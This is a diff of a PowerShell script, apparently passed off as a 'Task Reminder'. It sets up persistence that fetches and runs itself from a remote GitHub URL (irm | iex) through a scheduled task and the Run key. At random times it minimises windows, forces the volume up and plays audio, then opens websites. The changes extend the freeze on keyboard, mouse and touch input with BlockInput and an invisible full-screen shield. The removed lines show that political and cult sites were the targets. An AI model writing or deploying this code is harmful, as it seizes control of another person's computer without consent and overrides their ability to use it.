@@ -3,13 +3,12 @@ $BaseUrl   = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
 $ScriptUrl = "$BaseUrl/reminders.ps1"   # must match this script's filename in the repo
 
 $Sites = @{
-    1 = "https://heavensgate.com/"
-    2 = "https://action.aipac.org/aipac-pac-donate"
-    3 = "https://www.palantir.com/platforms/gotham/"
-    4 = "https://www.idf.il/en/mini-sites/how-to-join-us-and-voluntary-programs/how-to-join/"
-    5 = "https://www.cosmic-people.com/english/default_02_obr2903_en.htm"
+    1 = "https:///"
+    2 = "https://aoe"
+    3 = "https://wws//"
+    4 = "https://in/"
+    5 = "https://"
 }
-
 
 $MinSeconds      = 10
 $MaxSeconds      = 120
@@ -20,12 +19,17 @@ $MinimizeAll     = $true  # minimise all windows at each reminder
 $MaxAudioWait    = 60     # never wait longer than this (seconds) for audio to finish
 $ShowConsole     = $false # set to $true when debugging (keeps the window visible)
 
-$FreezeInput     = $true  # block keyboard/mouse while audio plays (no admin needed)
-$FreezeVolume    = $true  # keep volume pinned and unmuted while audio plays
+$FreezeInput           = $true  # block keyboard, mouse AND touchscreen during the break
+$FreezeVolume          = $true  # keep volume pinned and unmuted while audio plays
+$PostSiteFreezeSeconds = 5      # keep input frozen this long after the website opens
 
 $TaskName        = "TaskReminder"
 $DailyStartTime  = "08:00"  # daily start, in addition to every logon
 $LogonDelay      = "PT20S"  # wait after login before starting
+
+# Type this followed by a colon into Win+R to uninstall everything.
+# Letters/digits only, must start with a letter. Example: stopreminders:
+$UninstallPhrase = "deflock:"
 # ==========================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -71,7 +75,6 @@ if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
 $PID | Out-File (Join-Path $Dir "pid.txt")
 
 # ---- Autostart (runs as YOU, no admin needed) ----
-# Tries a scheduled task (logon + daily); falls back to the HKCU Run key. Result is logged.
 $PsExe  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
 $RunCmd = "irm '$ScriptUrl' | iex"
 $taskOk = $false
@@ -103,6 +106,58 @@ if (-not $taskOk) {
         Log "AUTOSTART: fell back to HKCU Run key"
     } catch { Log "AUTOSTART RUN KEY FAILED: $($_.Exception.Message)" }
 }
+
+# ---- Uninstaller: type "<phrase>:" into Win+R ----
+# Writes a local uninstall.ps1 and registers a custom URL protocol (HKCU, no admin) that runs it.
+try {
+    if ($UninstallPhrase -notmatch '^[A-Za-z][A-Za-z0-9]*$') { throw "UninstallPhrase must be letters/digits and start with a letter" }
+    $CtlDir = Join-Path $env:LOCALAPPDATA "TaskReminderCtl"
+    New-Item -ItemType Directory -Path $CtlDir -Force | Out-Null
+
+    $uninstallScript = @'
+$ErrorActionPreference = 'SilentlyContinue'
+$TaskName = 'TaskReminder'
+$Phrase   = '__PHRASE__'
+$Cache    = Join-Path $env:TEMP 'TaskReminder'
+$Ctl      = Join-Path $env:LOCALAPPDATA 'TaskReminderCtl'
+
+# 1. Stop the running reminder (input hooks are released when it dies)
+$pidFile = Join-Path $Cache 'pid.txt'
+if (Test-Path $pidFile) {
+    $p = [int](Get-Content $pidFile | Select-Object -First 1)
+    if ($p -and $p -ne $PID) { Stop-Process -Id $p -Force }
+}
+Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" |
+    Where-Object { $_.ProcessId -ne $PID -and $_.CommandLine -match 'reminders\.ps1' } |
+    ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
+Start-Sleep -Seconds 1
+
+# 2. Remove autostart (scheduled task + registry fallback)
+Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
+Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $TaskName
+
+# 3. Remove the Win+R phrase itself
+Remove-Item "HKCU:\Software\Classes\$Phrase" -Recurse -Force
+
+# 4. Remove cached files (images, audio, log)
+Remove-Item $Cache -Recurse -Force
+
+# 5. Remove this uninstaller folder after this process exits
+Start-Process cmd.exe -WindowStyle Hidden -ArgumentList ('/c ping -n 4 127.0.0.1 >nul & rd /s /q "' + $Ctl + '"')
+
+Add-Type -AssemblyName System.Windows.Forms
+[void][System.Windows.Forms.MessageBox]::Show('Reminders uninstalled: stopped, autostart removed, cached files deleted.', 'Task Reminder')
+'@
+    $uninstallScript = $uninstallScript.Replace('__PHRASE__', $UninstallPhrase)
+    Set-Content -Path (Join-Path $CtlDir "uninstall.ps1") -Value $uninstallScript -Encoding UTF8
+
+    $key = "HKCU:\Software\Classes\$UninstallPhrase"
+    $handler = "`"$PsExe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Join-Path $CtlDir 'uninstall.ps1')`""
+    New-Item -Path $key -Force -Value "URL:$UninstallPhrase" | Out-Null
+    New-ItemProperty -Path $key -Name "URL Protocol" -Value "" -Force | Out-Null
+    New-Item -Path "$key\shell\open\command" -Force -Value $handler | Out-Null
+    Log "UNINSTALL: type '${UninstallPhrase}:' into Win+R to remove everything"
+} catch { Log "UNINSTALL SETUP FAILED: $($_.Exception.Message)" }
 
 # ---- Wait for network (up to 60s) so the downloads work right after login ----
 $n = 0
@@ -142,7 +197,9 @@ public class WP {
     $wpOk = $true
 } catch { Log "WALLPAPER SETUP FAILED: $($_.Exception.Message)" }
 
-# ---- Input freeze support (low-level keyboard + mouse hooks, no admin needed) ----
+# ---- Input freeze support ----
+# Layer 1: low-level keyboard + mouse hooks (no admin needed)
+# Layer 2: BlockInput (only takes effect if this process happens to be elevated; blocks touch too)
 $freezeOk = $false
 if ($FreezeInput) {
     try {
@@ -158,6 +215,7 @@ public class InputFreezer {
     [DllImport("user32.dll", SetLastError=true)] static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
     [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
     [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("user32.dll")] static extern bool BlockInput(bool fBlock);
     [DllImport("kernel32.dll", CharSet=CharSet.Auto)] static extern IntPtr GetModuleHandle(string name);
     [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
     [DllImport("user32.dll")] static extern int GetMessage(out MSG msg, IntPtr hWnd, uint min, uint max);
@@ -173,6 +231,7 @@ public class InputFreezer {
     static uint tid;
     static ManualResetEvent ready;
     public static bool Ok;
+    public static bool BlockInputOk;
     public static int LastError;
 
     static IntPtr KbCallback(int n, IntPtr w, IntPtr l) { if (n >= 0) return (IntPtr)1; return CallNextHookEx(hKb, n, w, l); }
@@ -182,6 +241,7 @@ public class InputFreezer {
         if (t != null) return Ok;
         ready = new ManualResetEvent(false);
         Ok = false;
+        BlockInputOk = false;
         t = new Thread(() => {
             tid = GetCurrentThreadId();
             IntPtr mod = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
@@ -190,8 +250,10 @@ public class InputFreezer {
             hMs = SetWindowsHookEx(14, msProc, mod, 0);   // WH_MOUSE_LL
             if (hMs == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
             Ok = (hKb != IntPtr.Zero && hMs != IntPtr.Zero);
+            try { BlockInputOk = BlockInput(true); } catch { }
             ready.Set();
-            if (Ok) { MSG m; while (GetMessage(out m, IntPtr.Zero, 0, 0) > 0) { } }
+            if (Ok || BlockInputOk) { MSG m; while (GetMessage(out m, IntPtr.Zero, 0, 0) > 0) { } }
+            if (BlockInputOk) { try { BlockInput(false); } catch { } }
             if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
             if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
             hKb = IntPtr.Zero; hMs = IntPtr.Zero;
@@ -199,8 +261,8 @@ public class InputFreezer {
         t.IsBackground = true;
         t.Start();
         ready.WaitOne(3000);
-        if (!Ok) Stop();
-        return Ok;
+        if (!Ok && !BlockInputOk) { Stop(); return false; }
+        return true;
     }
 
     public static void Stop() {
@@ -210,12 +272,65 @@ public class InputFreezer {
             if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
             if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
         }
-        t = null; Ok = false;
+        t = null; Ok = false; BlockInputOk = false;
     }
 }
 "@
         $freezeOk = $true
     } catch { Log "INPUT FREEZE SETUP FAILED: $($_.Exception.Message)" }
+}
+
+# ---- Touch shield: near-invisible full-screen window that swallows touch/pen input ----
+$shieldOk = $false
+if ($FreezeInput) {
+    try {
+        Add-Type -ErrorAction Stop -ReferencedAssemblies System.Windows.Forms, System.Drawing -TypeDefinition @"
+using System;
+using System.Drawing;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+public class TouchShield {
+    [DllImport("user32.dll")] static extern bool SetProcessDPIAware();
+    static Form f;
+    static Thread t;
+    static ManualResetEvent ready;
+
+    public static void Start() {
+        if (t != null) return;
+        try { SetProcessDPIAware(); } catch { }
+        ready = new ManualResetEvent(false);
+        t = new Thread(() => {
+            f = new Form();
+            f.FormBorderStyle = FormBorderStyle.None;
+            f.StartPosition = FormStartPosition.Manual;
+            f.Bounds = SystemInformation.VirtualScreen;
+            f.TopMost = true;
+            f.ShowInTaskbar = false;
+            f.BackColor = Color.Black;
+            f.Opacity = 0.02;
+            f.Shown += (s, e) => { ready.Set(); };
+            Application.Run(f);
+        });
+        t.SetApartmentState(ApartmentState.STA);
+        t.IsBackground = true;
+        t.Start();
+        ready.WaitOne(3000);
+    }
+
+    public static void Stop() {
+        if (t == null) return;
+        try {
+            if (f != null && f.IsHandleCreated) f.Invoke((MethodInvoker)delegate { f.Close(); });
+        } catch { }
+        t.Join(2000);
+        t = null; f = null;
+    }
+}
+"@
+        $shieldOk = $true
+    } catch { Log "TOUCH SHIELD SETUP FAILED: $($_.Exception.Message)" }
 }
 
 # ---- System volume support (Windows Core Audio) ----
@@ -281,6 +396,30 @@ try {
     $player = New-Object System.Windows.Media.MediaPlayer
 } catch { Log "AUDIO SETUP FAILED: $($_.Exception.Message)" }
 
+# ---- Freeze helpers ----
+$script:frozen   = $false
+$script:shielded = $false
+
+function Start-Freeze {
+    if (-not $FreezeInput) { return }
+    if ($freezeOk -and -not $script:frozen) {
+        try {
+            $script:frozen = [InputFreezer]::Start()
+            if ($script:frozen) { Log "Input frozen (hooks: $([InputFreezer]::Ok), BlockInput: $([InputFreezer]::BlockInputOk))" }
+            else { Log "INPUT FREEZE FAILED (win32 error $([InputFreezer]::LastError))" }
+        } catch { Log "INPUT FREEZE ERROR: $($_.Exception.Message)" }
+    }
+    if ($shieldOk -and -not $script:shielded) {
+        try { [TouchShield]::Start(); $script:shielded = $true; Log "Touch shield on" }
+        catch { Log "TOUCH SHIELD ERROR: $($_.Exception.Message)" }
+    }
+}
+
+function Stop-Freeze {
+    if ($script:frozen)   { try { [InputFreezer]::Stop() } catch {}; $script:frozen = $false;   Log "Input released" }
+    if ($script:shielded) { try { [TouchShield]::Stop() } catch {}; $script:shielded = $false; Log "Touch shield off" }
+}
+
 # ---- Main loop ----
 $last = 0
 while ($true) {
@@ -305,7 +444,7 @@ while ($true) {
         } catch { Log "MINIMISE FAILED: $($_.Exception.Message)" }
     }
 
-    # 3. Set system volume, play audio and wait for it to finish
+    # 3. Set system volume and start audio
     $waitMs = 0
     if ($player) {
         try {
@@ -340,16 +479,10 @@ while ($true) {
         } catch { Log "AUDIO FAILED: $($_.Exception.Message)" }
     }
 
-    if ($waitMs -gt 0) {
-        # Freeze keyboard/mouse for the length of the audio
-        $frozen = $false
-        if ($FreezeInput -and $freezeOk) {
-            try {
-                $frozen = [InputFreezer]::Start()
-                if ($frozen) { Log "Input frozen" } else { Log "INPUT FREEZE FAILED (win32 error $([InputFreezer]::LastError))" }
-            } catch { Log "INPUT FREEZE ERROR: $($_.Exception.Message)" }
-        }
-        try {
+    # 4. Freeze through the audio, open the website, then keep frozen a few more seconds
+    try {
+        if ($waitMs -gt 0) {
+            Start-Freeze
             $end = (Get-Date).AddMilliseconds($waitMs)
             while ((Get-Date) -lt $end) {
                 if ($FreezeVolume -and $volOk) {
@@ -360,14 +493,20 @@ while ($true) {
                 }
                 Start-Sleep -Milliseconds 100
             }
-        } finally {
-            if ($frozen) { [InputFreezer]::Stop(); Log "Input released" }
         }
-    }
 
-    # 4. Open the website after the audio has finished
-    try { Start-Process $Sites[$x] -ErrorAction Stop }
-    catch { Log "OPEN SITE FAILED: $($_.Exception.Message)" }
+        # (if there was no audio, still freeze around the website opening)
+        Start-Freeze
+
+        try { Start-Process $Sites[$x] -ErrorAction Stop }
+        catch { Log "OPEN SITE FAILED: $($_.Exception.Message)" }
+
+        if ($script:frozen -or $script:shielded) {
+            Start-Sleep -Seconds $PostSiteFreezeSeconds
+        }
+    } finally {
+        Stop-Freeze
+    }
 
     Start-Sleep -Seconds (Get-Random -Minimum $MinSeconds -Maximum ($MaxSeconds + 1))
 }
